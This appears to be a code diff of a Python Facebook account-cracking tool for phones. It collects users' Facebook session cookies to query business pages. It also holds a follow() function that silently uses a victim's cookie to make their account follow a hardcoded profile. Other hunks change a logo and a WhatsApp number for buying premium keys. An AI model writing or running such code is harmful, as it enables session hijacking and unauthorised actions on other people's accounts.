@@ -128,7 +128,7 @@ def Public():
 		except requests.exceptions.ConnectionError:
 			print ( ' [×] Connection Timeout')
 			exit()
-	el if pil in ['2','02']:
+	elif pil in ['2','02']:
 		try:
 			cookie=input(" [+] Cookie : ")
 			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
@@ -374,17 +374,17 @@ def free(idf,pwv):
 	loop+=1
 def follow(ses,coki):
 	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-	r = sop(ses.get('https://www.facebook.com/profile.php?id=100080009552629, cookies={'cookie': coki}).text, 'html.parser')
+	r = sop(ses.get('https://mbasic.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
 	get = r.find('a', string='Follow').get('href')
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""\033[1;32m 
-\033[1;32m A
-\033[1;33m R
-\033[1;32m A
-\033[1;33m F
-\033[1;32m A
-\033[1;33m T
+\033[1;32m ╭━━━┳━━━┳━━━┳━━━┳━━━┳━━━━╮
+\033[1;33m ┃╭━╮┃╭━╮┃╭━╮┃╭━━┫╭━╮┃╭╮╭╮┃
+\033[1;32m ┃┃╱┃┃╰━╯┃┃╱┃┃╰━━┫┃╱┃┣╯┃┃╰╯
+\033[1;33m ┃╰━╯┃╭╮╭┫╰━╯┃╭━━┫╰━╯┃╱┃┃
+\033[1;32m ┃╭━╮┃┃┃╰┫╭━╮┃┃╱╱┃╭━╮┃╱┃┃
+\033[1;33m ╰╯╱╰┻╯╰━┻╯╱╰┻╯╱╱╰╯╱╰╯╱╰╯
                                               
 
 
@@ -1347,7 +1347,7 @@ def Subscraption():
 		input(" Press Enter To Send Key")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Email%20:%20'+lol+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ah+key1
-		os.system('am start https://wa.me/+8801960348450?text=' + tks)
+		os.system('am start https://wa.me/+8801749953660?text=' + tks)
 		Subscraption()        
 Subscraption()
 
